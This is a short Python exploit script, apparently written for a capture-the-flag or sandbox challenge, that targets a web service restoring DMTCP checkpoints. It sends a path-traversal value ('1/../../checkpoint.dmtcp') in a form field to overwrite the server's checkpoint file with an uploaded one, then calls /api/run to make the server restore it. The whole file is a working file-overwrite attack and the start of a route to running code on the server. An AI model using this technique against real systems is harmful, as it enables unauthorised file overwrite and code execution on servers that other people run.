"""Upload the pristine snapshot (saved from an earlier fresh instance) back to the
current instance's checkpoint.dmtcp and see if /api/run succeeds. This is the ground
truth test: if a remote-generated ckpt restores fine there, the block is my kernel."""
import requests
URL = 'https://8000-76df56ad42634ea9acf04c4e6016b534.sbx.secso.cc'
with open('snap_pristine.dmtcp','rb') as f:
    ckpt = f.read()
print('pristine ckpt size', len(ckpt))
r = requests.post(f"{URL}/api/config",
    data={'timestamp': '1/../../checkpoint.dmtcp'},
    files={'config': ('x.dmtcp', ckpt, 'application/octet-stream')},
    timeout=60)
print('upload', r.status_code, r.text[:200])
r = requests.post(f"{URL}/api/run", timeout=60)
print('run', r.status_code)
print(r.text[:2000])
r = requests.get(f"{URL}/api/status", timeout=30)
print('status', r.text[:1000])
